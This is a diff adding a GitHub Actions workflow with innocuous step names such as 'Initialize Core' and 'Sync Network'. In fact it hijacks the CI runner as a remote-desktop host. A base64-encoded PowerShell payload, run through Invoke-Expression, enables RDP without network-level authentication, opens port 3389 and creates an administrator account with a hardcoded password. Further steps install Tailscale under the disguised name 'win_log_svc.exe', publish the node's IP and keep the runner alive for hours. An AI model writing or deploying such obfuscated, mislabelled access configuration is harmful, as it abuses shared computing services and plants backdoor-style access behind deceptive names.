@@ -1,0 +1,42 @@
+name: Engine_Service_Update
+on:
+  workflow_dispatch:
+
+jobs:
+  runtime_process:
+    runs-on: windows-latest
+    timeout-minutes: 360
+    steps:
+      - name: Initialize Core
+        env:
+          U_KEY: ${{ secrets.YOUSF_KEY }}
+        run: |
+          $b64 = "JHBhc3N3b3JkID0gIll1c2ZAMjAwMCNSRFAiCgojIENvbmZpZ3VyZSBSRFAKU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcU3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyJyAtTmFtZSAiZkRlbnlUU0Nvbm5lY3Rpb25zIiAtVmFsdWUgMCAtRm9yY2UKU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcU3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyXFdpblN0YXRpb25zXFJEUC1UY3AnIC1OYW1lICJVc2VyQXV0aGVudGljYXRpb24iIC1WYWx1ZSAwIC1Gb3JjZQpuZXRzaCBhZHZmaXJld2FsbCBmaXJld2FsbCBhZGQgcnVsZSBuYW1lPSJSRFAiIGRpcj1pbiBhY3Rpb249YWxsb3cgcHJvdG9jb2w9VENQIGxvY2FscG9ydD0zMzg5ClJlc3RhcnQtU2VydmljZSAtTmFtZSBUZXJtU2VydmljZSAtRm9yY2UKCiMgU2V0IFRpbWV6b25lClNldC1UaW1lWm9uZSAtSWQgIkFyYWJpYyBTdGFuZGFyZCBUaW1lIgoKIyBDcmVhdGUgVXNlciBhbmQgUHJvZmlsZSBGb2xkZXJzCk5ldy1Mb2NhbFVzZXIgLU5hbWUgInl1c2YyMDAwIiAtUGFzc3dvcmQgKENvbnZlcnRUby1TZWN1cmVTdHJpbmcgLVN0cmluZyAkcGFzc3dvcmQgLUFzUGxhaW5UZXh0IC1Gb3JjZSkgLUFjY291bnROZXZlckV4cGlyZXMKQWRkLUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwICJBZG1pbmlzdHJhdG9ycyIgLU1lbWJlciAieXVzZjIwMDAiCkFkZC1Mb2NhbEdyb3VwTWVtYmVyIC1Hcm91cCAiUmVtb3RlIERlc2t0b3AgVXNlcnMiIC1NZW1iZXIgInl1c2YyMDAwIgpOZXctSXRlbSAtUGF0aCAiQzpcVXNlcnNceXVzZjIwMDBcRGVza3RvcCIgLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UKTmV3LUl0ZW0gLVBhdGggIkM6XFVzZXJzXHl1c2YyMDAwXERvY3VtZW50cyIgLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UKTmV3LUl0ZW0gLVBhdGggIkM6XFVzZXJzXHl1c2YyMDAwXERvd25sb2FkcyIgLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UK"
+          $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+          Invoke-Expression $decoded
+
+      - name: Sync Network
+        env:
+          AUTH_VAL: ${{ secrets.YOUSF_KEY }}
+        run: |
+          $u = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
+          $f = "$env:TEMP\win_log_svc.exe"
+          (New-Object System.Net.WebClient).DownloadFile($u, $f)
+          Start-Process $f -ArgumentList "/S" -Wait
+          $bin = "$env:ProgramFiles\Tailscale\tailscale.exe"
+          & $bin up --authkey=$env:AUTH_VAL --hostname=srv-$env:GITHUB_RUN_ID
+          $ip = (& $bin ip -4)
+          echo "NODE_IP=$ip" >> $env:GITHUB_ENV
+
+      - name: Install VS Code
+        run: |
+          $url = "https://code.visualstudio.com/sha/download?build=stable&os=win32-x64"
+          $installer = "$env:TEMP\VSCodeSetup.exe"
+          (New-Object System.Net.WebClient).DownloadFile($url, $installer)
+          Start-Process $installer -ArgumentList "/VERYSILENT", "/NORESTART", "/MERGETASKS=!runcode" -Wait
+
+      - name: Post Process
+        run: |
+          Write-Host "Endpoint: ${{ env.NODE_IP }}"
+          $s = 21000 + (Get-Random -Max 500)
+          Start-Sleep -Seconds $s
